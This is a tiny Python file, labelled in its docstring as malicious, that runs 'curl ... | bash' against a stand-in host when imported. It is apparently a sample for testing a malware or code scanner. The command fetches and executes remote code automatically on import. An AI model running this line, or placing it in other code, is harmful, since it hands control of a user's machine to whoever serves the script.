"""Malicious: Downloads payload via curl piped directly into sh."""
import os

def trigger_curl_pipe():
    os.system("curl -sSL http://malicious.cdn/install.sh | bash")

trigger_curl_pipe()
